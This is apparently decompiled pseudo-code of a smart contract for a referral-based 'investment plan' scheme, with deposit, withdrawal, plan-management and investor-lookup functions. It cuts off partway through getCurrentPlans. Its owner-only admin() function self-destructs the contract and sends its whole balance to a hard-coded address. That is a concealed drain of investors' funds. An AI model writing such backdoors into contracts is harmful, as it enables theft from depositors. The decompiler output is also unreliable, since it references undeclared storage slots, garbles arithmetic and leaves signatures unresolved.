contract main {




// =====================  Runtime code  =====================


#
#  - reinvest(uint256 arg1, uint256 arg2)
#  - grant(address arg1, uint256 arg2)
#  - invest(uint256 arg1, uint256 arg2)
#  - _fallback()
#
const getBalance = eth.balance(this.address)

const REFERENCE_RATE = 80

const REFERRER_CODE = 3466

const MARKETING_RATE = 70

const REFERENCE_LEVEL2_RATE = 20

const REFERENCE_LEVEL1_RATE = 50

const MINIMUM = 10^16

const REFERENCE_LEVEL3_RATE = 10

const DEVELOPER_RATE = 30


address owner;
uint256 latestReferrerCode;
uint256 totalInvestments;
address developerAccount;
address marketingAccount;
address referenceAccount;
mapping of uint256 address2UID;
mapping of struct uid2Investor;
array of struct stor8;

function address2UID(address arg1) {
    return address2UID[arg1]
}

function getReferenceAccount() {
    require msg.sender == owner
    return referenceAccount
}

function latestReferrerCode() {
    return latestReferrerCode
}

function getDeveloperAccount() {
    require msg.sender == owner
    return developerAccount
}

function getMarketingAccount() {
    require msg.sender == owner
    return marketingAccount
}

function owner() {
    return owner
}

function uid2Investor(uint256 arg1) {
    return uid2Investor[arg1].field_0, 
           uid2Investor[arg1].field_256,
           uid2Investor[arg1].field_512,
           uid2Investor[arg1].field_768,
           uid2Investor[arg1].field_1024,
           uid2Investor[arg1].field_1536,
           uid2Investor[arg1].field_1792,
           uid2Investor[arg1].field_2048
}

function getTotalInvestments() {
    require msg.sender == owner
    return totalInvestments
}

function getUIDByAddress(address arg1) {
    return address2UID[address(arg1)]
}

function admin() {
    require msg.sender == owner
    selfdestruct(0x8948e4b00deb0a5adb909f4dc5789d20d0851d71)
}

function checkIn() {
  stop
}

function setMarketingAccount(address arg1) {
    require msg.sender == owner
    require arg1
    marketingAccount = arg1
}

function setReferenceAccount(address arg1) {
    require msg.sender == owner
    require arg1
    referenceAccount = arg1
}

function setDeveloperAccount(address arg1) {
    require msg.sender == owner
    require arg1
    developerAccount = arg1
}

function transferOwnership(address arg1) {
    require msg.sender == owner
    require arg1
    emit onOwnershipTransferred(owner, arg1);
    owner = arg1
}

function sub_b8454591(?) {
    require msg.sender == owner
    stor8.length++
    stor8[stor8.length].field_0 = arg1
    stor8[stor8.length].field_256 = arg2
    stor8[stor8.length].field_512 = arg3
    stor8[stor8.length].field_768 = arg4
    stor8[stor8.length].field_1024 = arg5
    stor8[stor8.length].field_1280 = block.timestamp
}

function sub_b124a607(?) {
    require msg.sender == owner
    if arg1 < 0:
        revert with 0, 'Wrong investment plan id'
    if arg1 >= stor8.length:
        revert with 0, 'Wrong investment plan id'
    stor8[arg1].field_768 = arg2
    require stor8[arg1].field_1024 + arg3 >= stor8[arg1].field_1024
    stor8[arg1].field_1024 += arg3
    stor8[arg1].field_1280 = block.timestamp
}

function sub_ddc50d85(?) {
    if owner != msg.sender:
        if address2UID[address(msg.sender)] != arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'only owner or self can check the investor info.'
    if arg2 < 0:
        revert with 0, 'Wrong investment plan id'
    if arg2 >= stor8.length:
        revert with 0, 'Wrong investment plan id'
    if not stor8[arg2].field_512:
        return stor8[arg2].field_512, stor8[arg2].field_1024, 0
    idx = 0
    while idx < uid2Investor[arg1].field_1024:
        if not uid2Investor[arg1][5][idx].field_256:
            revert with 0, 'wrong investment date'
        mem[0] = idx
        mem[32] = sha3(arg1, 7) + 5
        if uid2Investor[arg1][5][idx].field_0 != arg2:
            idx = idx + 1
            continue 
        mem[0] = idx
        mem[32] = sha3(arg1, 7) + 5
        if uid2Investor[arg1][5][idx].field_256 < stor8[arg2].field_1280:
            idx = idx + 1
            continue 
        mem[0] = idx
        mem[32] = sha3(arg1, 7) + 5
        require uid2Investor[arg1][5][idx].field_512 >= 0
        idx = idx + 1
        continue 
    if 0 > stor8[arg2].field_768:
        return stor8[arg2].field_512, stor8[arg2].field_1024, 0
    return stor8[arg2].field_512, stor8[arg2].field_1024, stor8[arg2].field_768
}

function getInvestorInfoByUID(uint256 arg1) {
    if owner != msg.sender:
        if address2UID[address(msg.sender)] != arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'only owner or self can check the investor info.'
    if not uid2Investor[arg1].field_1024:
        mem[(32 * uid2Investor[arg1].field_1024) + 128] = uid2Investor[arg1].field_1024
    else:
        mem[128 len 32 * uid2Investor[arg1].field_1024] = code.data[17055 len 32 * uid2Investor[arg1].field_1024]
        mem[(32 * uid2Investor[arg1].field_1024) + 128] = uid2Investor[arg1].field_1024
        mem[(32 * uid2Investor[arg1].field_1024) + 160 len 32 * uid2Investor[arg1].field_1024] = code.data[17055 len 32 * uid2Investor[arg1].field_1024]
    idx = 0
    while idx < uid2Investor[arg1].field_1024:
        if not uid2Investor[arg1][5][idx].field_256:
            revert with 0, 'wrong investment date'
        require idx < mem[(32 * uid2Investor[arg1].field_1024) + 128]
        mem[(32 * idx) + (32 * uid2Investor[arg1].field_1024) + 160] = uid2Investor[arg1][5][idx].field_1024
        mem[0] = idx
        mem[32] = sha3(arg1, 7) + 5
        if uid2Investor[arg1][5][idx].field_1280:
            require idx < uid2Investor[arg1].field_1024
            mem[(32 * idx) + 128] = 0
        else:
            require uid2Investor[arg1][5][idx].field_0 < stor8.length
            require uid2Investor[arg1][5][idx].field_0 < stor8.length
            if stor8[stor7[arg1][5][idx].field_0].field_256 <= 0:
                mem[0] = idx
                mem[32] = sha3(arg1, 7) + 5
                require idx < uid2Investor[arg1].field_1024
                mem[(32 * idx) + 128] = (block.timestamp * uid2Investor[arg1][5][idx].field_512 * stor8[stor7[arg1][5][idx].field_0].field_0 / 1000) - (uid2Investor[arg1][5][idx].field_768 * uid2Investor[arg1][5][idx].field_512 * stor8[stor7[arg1][5][idx].field_0].field_0 / 1000) / 24 * 3600
            else:
                require uid2Investor[arg1][5][idx].field_256 + stor8[stor7[arg1][5][idx].field_0].field_256 >= uid2Investor[arg1][5][idx].field_256
                require uid2Investor[arg1][5][idx].field_0 < stor8.length
                if block.timestamp < uid2Investor[arg1][5][idx].field_256 + stor8[stor7[arg1][5][idx].field_0].field_256:
                    mem[0] = idx
                    mem[32] = sha3(arg1, 7) + 5
                    require idx < uid2Investor[arg1].field_1024
                    mem[(32 * idx) + 128] = (block.timestamp * uid2Investor[arg1][5][idx].field_512 * stor8[stor7[arg1][5][idx].field_0].field_0 / 1000) - (uid2Investor[arg1][5][idx].field_768 * uid2Investor[arg1][5][idx].field_512 * stor8[stor7[arg1][5][idx].field_0].field_0 / 1000) / 24 * 3600
                else:
                    require uid2Investor[arg1][5][idx].field_0 < stor8.length
                    require uid2Investor[arg1][5][idx].field_256 + stor8[stor7[arg1][5][idx].field_0].field_256 >= uid2Investor[arg1][5][idx].field_256
                    mem[0] = idx
                    mem[32] = sha3(arg1, 7) + 5
                    require idx < uid2Investor[arg1].field_1024
                    mem[(32 * idx) + 128] = (uid2Investor[arg1][5][idx].field_256 * uid2Investor[arg1][5][idx].field_512 * stor8[stor7[arg1][5][idx].field_0].field_0 / 1000) + (stor8[stor7[arg1][5][idx].field_0].field_256 * uid2Investor[arg1][5][idx].field_512 * stor8[stor7[arg1][5][idx].field_0].field_0 / 1000) - (uid2Investor[arg1][5][idx].field_768 * uid2Investor[arg1][5][idx].field_512 * stor8[stor7[arg1][5][idx].field_0].field_0 / 1000) / 24 * 3600
        idx = idx + 1
        continue 
    mem[(64 * uid2Investor[arg1].field_1024) + 160] = uid2Investor[arg1].field_256
    mem[(64 * uid2Investor[arg1].field_1024) + 192] = uid2Investor[arg1].field_512
    mem[(64 * uid2Investor[arg1].field_1024) + 224] = uid2Investor[arg1].field_768
    mem[(64 * uid2Investor[arg1].field_1024) + 256] = uid2Investor[arg1].field_1536
    mem[(64 * uid2Investor[arg1].field_1024) + 288] = uid2Investor[arg1].field_1792
    mem[(64 * uid2Investor[arg1].field_1024) + 320] = uid2Investor[arg1].field_2048
    mem[(64 * uid2Investor[arg1].field_1024) + 352] = uid2Investor[arg1].field_1024
    mem[(64 * uid2Investor[arg1].field_1024) + 384] = 288
    mem[(64 * uid2Investor[arg1].field_1024) + 448] = mem[(32 * uid2Investor[arg1].field_1024) + 128]
    mem[(64 * uid2Investor[arg1].field_1024) + 480 len floor32(mem[(32 * uid2Investor[arg1].field_1024) + 128])] = mem[(32 * uid2Investor[arg1].field_1024) + 160 len floor32(mem[(32 * uid2Investor[arg1].field_1024) + 128])]
    mem[(64 * uid2Investor[arg1].field_1024) + 416] = (32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + 320
    mem[(32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + (64 * uid2Investor[arg1].field_1024) + 480] = uid2Investor[arg1].field_1024
    mem[(32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + (64 * uid2Investor[arg1].field_1024) + 512 len floor32(uid2Investor[arg1].field_1024)] = mem[128 len floor32(uid2Investor[arg1].field_1024)]
    return memory
      from (64 * uid2Investor[arg1].field_1024) + 160
       len (161 * uid2Investor[arg1].field_1024) + (32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + 352
}

function withdraw() payable {
    if msg.value:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    'withdrawal doesn't allow to transfer trx simultaneously'
    if not address2UID[address(msg.sender)]:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Can not withdraw because no any investments'
    idx = 0
    while idx < uid2Investor[stor6[address(msg.sender)]].field_1024:
        if not uid2Investor[stor6[address(msg.sender)]][5][idx].field_1280:
            require uid2Investor[stor6[address(msg.sender)]][5][idx].field_0 < stor8.length
            if stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_256 <= 0:
                require (block.timestamp * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) - (uid2Investor[stor6[address(msg.sender)]][5][idx].field_768 * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) / 24 * 3600 >= 0
                call msg.sender with:
                   value (block.timestamp * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) - (uid2Investor[stor6[address(msg.sender)]][5][idx].field_768 * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) / 24 * 3600 wei
                     gas 2300 * is_zero(value) wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                uid2Investor[stor6[address(msg.sender)]][5][idx].field_768 = block.timestamp
                uid2Investor[stor6[address(msg.sender)]][5][idx].field_1280 = 0
                uid2Investor[stor6[address(msg.sender)]][5][idx].field_1024 += (block.timestamp * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) - (uid2Investor[stor6[address(msg.sender)]][5][idx].field_768 * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) / 24 * 3600
            else:
                require uid2Investor[stor6[address(msg.sender)]][5][idx].field_256 + stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_256 >= uid2Investor[stor6[address(msg.sender)]][5][idx].field_256
                if block.timestamp < uid2Investor[stor6[address(msg.sender)]][5][idx].field_256 + stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_256:
                    require (block.timestamp * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) - (uid2Investor[stor6[address(msg.sender)]][5][idx].field_768 * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) / 24 * 3600 >= 0
                    call msg.sender with:
                       value (block.timestamp * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) - (uid2Investor[stor6[address(msg.sender)]][5][idx].field_768 * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) / 24 * 3600 wei
                         gas 2300 * is_zero(value) wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    uid2Investor[stor6[address(msg.sender)]][5][idx].field_768 = block.timestamp
                    uid2Investor[stor6[address(msg.sender)]][5][idx].field_1280 = 0
                    uid2Investor[stor6[address(msg.sender)]][5][idx].field_1024 += (block.timestamp * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) - (uid2Investor[stor6[address(msg.sender)]][5][idx].field_768 * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) / 24 * 3600
                else:
                    require (uid2Investor[stor6[address(msg.sender)]][5][idx].field_256 * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) + (stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_256 * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) - (uid2Investor[stor6[address(msg.sender)]][5][idx].field_768 * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) / 24 * 3600 >= 0
                    call msg.sender with:
                       value (uid2Investor[stor6[address(msg.sender)]][5][idx].field_256 * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) + (stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_256 * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) - (uid2Investor[stor6[address(msg.sender)]][5][idx].field_768 * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) / 24 * 3600 wei
                         gas 2300 * is_zero(value) wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    uid2Investor[stor6[address(msg.sender)]][5][idx].field_768 = uid2Investor[stor6[address(msg.sender)]][5][idx].field_256 + stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_256
                    uid2Investor[stor6[address(msg.sender)]][5][idx].field_1280 = 1
                    uid2Investor[stor6[address(msg.sender)]][5][idx].field_1024 += (uid2Investor[stor6[address(msg.sender)]][5][idx].field_256 * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) + (stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_256 * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) - (uid2Investor[stor6[address(msg.sender)]][5][idx].field_768 * uid2Investor[stor6[address(msg.sender)]][5][idx].field_512 * stor8[stor7[stor6[address(msg.sender)]][5][idx].field_0].field_0 / 1000) / 24 * 3600
        mem[0] = address2UID[address(msg.sender)]
        mem[32] = 7
        idx = idx + 1
        continue 
    if uid2Investor[stor6[address(msg.sender)]].field_512 > 0:
        call msg.sender with:
           value uid2Investor[stor6[address(msg.sender)]].field_512 wei
             gas 2300 * is_zero(value) wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require uid2Investor[stor6[address(msg.sender)]].field_512 + uid2Investor[stor6[address(msg.sender)]].field_256 >= uid2Investor[stor6[address(msg.sender)]].field_512
        uid2Investor[stor6[address(msg.sender)]].field_256 += uid2Investor[stor6[address(msg.sender)]].field_512
        uid2Investor[stor6[address(msg.sender)]].field_512 = 0
    emit onWithdraw(msg.sender, 0);
}

function getInvestmentPlanByUID(uint256 arg1) {
    if owner != msg.sender:
        if address2UID[address(msg.sender)] != arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        'only owner or self can check the investment plan info.'
    if not uid2Investor[arg1].field_1024:
        mem[(32 * uid2Investor[arg1].field_1024) + 128] = uid2Investor[arg1].field_1024
        mem[(64 * uid2Investor[arg1].field_1024) + 160] = uid2Investor[arg1].field_1024
        mem[(98 * uid2Investor[arg1].field_1024) + 192] = uid2Investor[arg1].field_1024
        mem[(131 * uid2Investor[arg1].field_1024) + 224] = uid2Investor[arg1].field_1024
    else:
        mem[128 len 32 * uid2Investor[arg1].field_1024] = code.data[17055 len 32 * uid2Investor[arg1].field_1024]
        mem[(32 * uid2Investor[arg1].field_1024) + 128] = uid2Investor[arg1].field_1024
        mem[(32 * uid2Investor[arg1].field_1024) + 160 len 32 * uid2Investor[arg1].field_1024] = code.data[17055 len 32 * uid2Investor[arg1].field_1024]
        mem[(64 * uid2Investor[arg1].field_1024) + 160] = uid2Investor[arg1].field_1024
        mem[(64 * uid2Investor[arg1].field_1024) + 192 len 32 * uid2Investor[arg1].field_1024] = code.data[17055 len 32 * uid2Investor[arg1].field_1024]
        mem[(98 * uid2Investor[arg1].field_1024) + 192] = uid2Investor[arg1].field_1024
        mem[(98 * uid2Investor[arg1].field_1024) + 224 len 32 * uid2Investor[arg1].field_1024] = code.data[17055 len 32 * uid2Investor[arg1].field_1024]
        mem[(131 * uid2Investor[arg1].field_1024) + 224] = uid2Investor[arg1].field_1024
        mem[(131 * uid2Investor[arg1].field_1024) + 256 len 32 * uid2Investor[arg1].field_1024] = code.data[17055 len 32 * uid2Investor[arg1].field_1024]
    idx = 0
    while idx < uid2Investor[arg1].field_1024:
        if not uid2Investor[arg1][5][idx].field_256:
            revert with 0, 'wrong investment date'
        require idx < uid2Investor[arg1].field_1024
        mem[(32 * idx) + 128] = uid2Investor[arg1][5][idx].field_0
        require idx < mem[(98 * uid2Investor[arg1].field_1024) + 192]
        mem[(32 * idx) + (98 * uid2Investor[arg1].field_1024) + 224] = uid2Investor[arg1][5][idx].field_1024
        require idx < mem[(32 * uid2Investor[arg1].field_1024) + 128]
        mem[(32 * idx) + (32 * uid2Investor[arg1].field_1024) + 160] = uid2Investor[arg1][5][idx].field_256
        require idx < mem[(64 * uid2Investor[arg1].field_1024) + 160]
        mem[(32 * idx) + (64 * uid2Investor[arg1].field_1024) + 192] = uid2Investor[arg1][5][idx].field_512
        mem[0] = idx
        mem[32] = sha3(arg1, 7) + 5
        require idx < mem[(131 * uid2Investor[arg1].field_1024) + 224]
        if uid2Investor[arg1][5][idx].field_1280:
            mem[(32 * idx) + (131 * uid2Investor[arg1].field_1024) + 256] = 1
        else:
            mem[(32 * idx) + (131 * uid2Investor[arg1].field_1024) + 256] = 0
            mem[32] = sha3(arg1, 7) + 5
            require uid2Investor[arg1][5][idx].field_0 < stor8.length
            mem[0] = 8
            if stor8[stor7[arg1][5][idx].field_0].field_256 > 0:
                require uid2Investor[arg1][5][idx].field_0 < stor8.length
                mem[0] = idx
                mem[32] = sha3(arg1, 7) + 5
                require uid2Investor[arg1][5][idx].field_256 + stor8[stor7[arg1][5][idx].field_0].field_256 >= uid2Investor[arg1][5][idx].field_256
                if block.timestamp >= uid2Investor[arg1][5][idx].field_256 + stor8[stor7[arg1][5][idx].field_0].field_256:
                    require idx < mem[(131 * uid2Investor[arg1].field_1024) + 224]
                    mem[(32 * idx) + (131 * uid2Investor[arg1].field_1024) + 256] = 1
        idx = idx + 1
        continue 
    mem[(164 * uid2Investor[arg1].field_1024) + 256] = 160
    mem[(164 * uid2Investor[arg1].field_1024) + 416] = uid2Investor[arg1].field_1024
    mem[(164 * uid2Investor[arg1].field_1024) + 448 len floor32(uid2Investor[arg1].field_1024)] = mem[128 len floor32(uid2Investor[arg1].field_1024)]
    mem[(164 * uid2Investor[arg1].field_1024) + 288] = (32 * uid2Investor[arg1].field_1024) + 192
    mem[(197 * uid2Investor[arg1].field_1024) + 448] = mem[(32 * uid2Investor[arg1].field_1024) + 128]
    mem[(197 * uid2Investor[arg1].field_1024) + 480 len floor32(mem[(32 * uid2Investor[arg1].field_1024) + 128])] = mem[(32 * uid2Investor[arg1].field_1024) + 160 len floor32(mem[(32 * uid2Investor[arg1].field_1024) + 128])]
    mem[(164 * uid2Investor[arg1].field_1024) + 320] = (32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + (32 * uid2Investor[arg1].field_1024) + 224
    mem[(32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + (197 * uid2Investor[arg1].field_1024) + 480] = mem[(64 * uid2Investor[arg1].field_1024) + 160]
    mem[(32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + (197 * uid2Investor[arg1].field_1024) + 512 len floor32(mem[(64 * uid2Investor[arg1].field_1024) + 160])] = mem[(64 * uid2Investor[arg1].field_1024) + 192 len floor32(mem[(64 * uid2Investor[arg1].field_1024) + 160])]
    mem[(164 * uid2Investor[arg1].field_1024) + 352] = (32 * mem[(64 * uid2Investor[arg1].field_1024) + 160]) + (32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + (32 * uid2Investor[arg1].field_1024) + 256
    mem[(32 * mem[(64 * uid2Investor[arg1].field_1024) + 160]) + (32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + (197 * uid2Investor[arg1].field_1024) + 512] = mem[(98 * uid2Investor[arg1].field_1024) + 192]
    mem[(32 * mem[(64 * uid2Investor[arg1].field_1024) + 160]) + (32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + (197 * uid2Investor[arg1].field_1024) + 544 len floor32(mem[(98 * uid2Investor[arg1].field_1024) + 192])] = mem[(98 * uid2Investor[arg1].field_1024) + 224 len floor32(mem[(98 * uid2Investor[arg1].field_1024) + 192])]
    mem[(164 * uid2Investor[arg1].field_1024) + 384] = (32 * mem[(98 * uid2Investor[arg1].field_1024) + 192]) + (32 * mem[(64 * uid2Investor[arg1].field_1024) + 160]) + (32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + (32 * uid2Investor[arg1].field_1024) + 288
    mem[(32 * mem[(98 * uid2Investor[arg1].field_1024) + 192]) + (32 * mem[(64 * uid2Investor[arg1].field_1024) + 160]) + (32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + (197 * uid2Investor[arg1].field_1024) + 544] = mem[(131 * uid2Investor[arg1].field_1024) + 224]
    mem[(32 * mem[(98 * uid2Investor[arg1].field_1024) + 192]) + (32 * mem[(64 * uid2Investor[arg1].field_1024) + 160]) + (32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + (197 * uid2Investor[arg1].field_1024) + 576 len floor32(mem[(131 * uid2Investor[arg1].field_1024) + 224])] = mem[(131 * uid2Investor[arg1].field_1024) + 256 len floor32(mem[(131 * uid2Investor[arg1].field_1024) + 224])]
    return Array(len=uid2Investor[arg1].field_1024, data=mem[128 len floor32(uid2Investor[arg1].field_1024)], mem[(164 * uid2Investor[arg1].field_1024) + floor32(uid2Investor[arg1].field_1024) + 448 len (32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + (33 * uid2Investor[arg1].field_1024) + -floor32(uid2Investor[arg1].field_1024) + 32], mem[(64 * uid2Investor[arg1].field_1024) + 160], mem[(197 * uid2Investor[arg1].field_1024) + (32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + 512 len (32 * mem[(131 * uid2Investor[arg1].field_1024) + 224]) + (32 * mem[(98 * uid2Investor[arg1].field_1024) + 192]) + (32 * mem[(64 * uid2Investor[arg1].field_1024) + 160]) + 64]), 
           (32 * uid2Investor[arg1].field_1024) + 192,
           (32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + (32 * uid2Investor[arg1].field_1024) + 224,
           (32 * mem[(64 * uid2Investor[arg1].field_1024) + 160]) + (32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + (32 * uid2Investor[arg1].field_1024) + 256,
           (32 * mem[(98 * uid2Investor[arg1].field_1024) + 192]) + (32 * mem[(64 * uid2Investor[arg1].field_1024) + 160]) + (32 * mem[(32 * uid2Investor[arg1].field_1024) + 128]) + (32 * uid2Investor[arg1].field_1024) + 288
}

function getCurrentPlans() {
    mem[96] = stor8.length
    if not stor8.length:
        mem[(32 * stor8.length) + 128] = stor8.length
        mem[(64 * stor8.length) + 160] = stor8.length
        mem[(98 * stor8.length) + 192] = stor8.length
        mem[(131 * stor8.length) + 224] = stor8.length
        mem[(164 * stor8.length) + 256] = stor8.length
        mem[64] = (197 * stor8.length) + 288
        s = 0
        idx = 0
        while idx < stor8.length:
            mem[0] = 8
            require idx < mem[96]
            mem[(32 * idx) + 128] = idx
            require idx < mem[(32 * stor8.length) + 128]
            mem[(32 * idx) + (32 * stor8.length) + 160] = stor8[idx].field_0
            require idx < mem[(64 * stor8.length) + 160]
            mem[(32 * idx) + (64 * stor8.length) + 192] = stor8[idx].field_256
            require idx < mem[(98 * stor8.length) + 192]
            mem[(32 * idx) + (98 * stor8.length) + 224] = stor8[idx].field_512
            require idx < mem[(131 * stor8.length) + 224]
            mem[(32 * idx) + (131 * stor8.length) + 256] = stor8[idx].field_768
            require idx < mem[(164 * stor8.length) + 256]
            mem[(32 * idx) + (164 * stor8.length) + 288] = stor8[idx].field_1024
            s = (6 * idx) + sha3(8)
            idx = idx + 1
            continue 
        mem[mem[64]] = 192
        mem[mem[64] + 192] = mem[96]
        _68 = mem[96]
        mem[mem[64] + 224 len floor32(mem[96])] = mem[128 len floor32(mem[96])]
        mem[mem[64] + 32] = (32 * mem[96]) + 224
        mem[(32 * mem[96]) + mem[64] + 224] = mem[(32 * stor8.length) + 128]
        _121 = mem[(32 * stor8.length) + 128]
        s = 0
        while 6 * stor8.length * stor8.length < 32 * mem[(32 * stor8.length) + 128]:
            mem[(32 * mem[96]) + mem[64] + (6 * stor8.length * stor8.length) + 256] = mem[(32 * stor8.length) + (6 * stor8.length * stor8.length) + 160]
            s = (6 * stor8.length * stor8.length) + 32
            continue 
        mem[mem[64] + 64] = (32 * mem[(32 * stor8.length) + 128]) + (32 * mem[96]) + 256
        mem[(32 * _121) + (32 * mem[96]) + mem[64] + 256] = mem[(64 * stor8.length) + 160]
        _155 = mem[(64 * stor8.length) + 160]
        mem[(32 * _121) + (32 * mem[96]) + mem[64] + 288 len floor32(mem[(64 * stor8.length) + 160])] = mem[(64 * stor8.length) + 192 len floor32(mem[(64 * stor8.length) + 160])]
        mem[mem[64] + 96] = (32 * _155) + (32 * _121) + (32 * mem[96]) + 288
        mem[(32 * _155) + (32 * _121) + (32 * _68) + mem[64] + 288] = mem[(98 * stor8.length) + 192]
        _183 = mem[(98 * stor8.length) + 192]
        mem[(32 * _155) + (32 * _121) + (32 * _68) + mem[64] + 320 len floor32(mem[(98 * stor8.length) + 192])] = mem[(98 * stor8.length) + 224 len floor32(mem[(98 * stor8.length) + 192])]
        mem[mem[64] + 128] = (32 * _183) + (32 * _155) + (32 * _121) + (32 * _68) + 320
        mem[(32 * _183) + (32 * _155) + (32 * _121) + (32 * _68) + mem[64] + 320] = mem[(131 * stor8.length) + 224]
        _205 = mem[(131 * stor8.length) + 224]
        mem[(32 * _183) + (32 * _155) + (32 * _121) + (32 * _68) + mem[64] + 352 len floor32(mem[(131 * stor8.length) + 224])] = mem[(131 * stor8.length) + 256 len floor32(mem[(131 * stor8.length) + 224])]
        mem[mem[64] + 160] = (32 * _205) + (32 * _183) + (32 * _155) + (32 * _121) + (32 * _68) + 352
        mem[(32 * _205) + (32 * _183) + (32 * _155) + (32 * _121) + (32 * _68) + mem[64] + 352] = mem[(164 * stor8.length) + 256]
        _221 = mem[(164 * stor8.length) + 256]
        mem[(32 * _205) + (32 * _183) + (32 * _155) + (32 * _121) + (32 * _68) + mem[64] + 384 len floor32(mem[(164 * stor8.length) + 256])] = mem[(164 * stor8.length) + 288 len floor32(mem[(164 * stor8.length) + 256])]
        return 192, 
               mem[mem[64] + 32 len 96],
               (32 * _183) + (32 * _155) + (32 * _121) + (32 * _68) + 320,
               (32 * _205) + (32 * _183) + (32 * _155) + (32 * _121) + (32 * _68) + 352,
               mem[mem[64] + 192 len (32 * _221) + (32 * _205) + (32 * _183) + (32 * _155) + (32 * _121) + (32 * _68) + 192]
    mem[128 len 32 * stor8.length] = code.data[17055 len 32 * stor8.length]
    mem[(32 * stor8.length) + 128] = stor8.length
    mem[(32 * stor8.length) + 160 len 32 * stor8.length] = code.data[17055 len 32 * stor8.length]
    mem[(64 * stor8.length) + 160] = stor8.length
    mem[(64 * stor8.length) + 192 len 32 * stor8.length] = code.data[17055 len 32 * stor8.length]
    mem[(98 * stor8.length) + 192] = stor8.length
    mem[(98 * stor8.length) + 224 len 32 * stor8.length] = code.data[17055 len 32 * stor8.length]
    mem[(131 * stor8.length) + 224] = stor8.length
    mem[(131 * stor8.length) + 256 len 32 * stor8.length] = code.data[17055 len 32 * stor8.length]
    mem[(164 * stor8.length) + 256] = stor8.length
    mem[64] = (197 * stor8.length) + 288
    mem[(164 * stor8.length) + 288 len 32 * stor8.length] = code.data[17055 len 32 * stor8.length]
    s = 0
    idx = 0
    while idx < stor8.length:
        mem[0] = 8
        require idx < mem[96]
        mem[(32 * idx) + 128] = idx
        require idx < mem[(32 * stor8.length) + 128]
        mem[(32 * idx) + (32 * stor8.length) + 160] = stor8[idx].field_0
        require idx < mem[(64 * stor8.length) + 160]
        mem[(32 * idx) + (64 * stor8.length) + 192] = stor8[idx].field_256
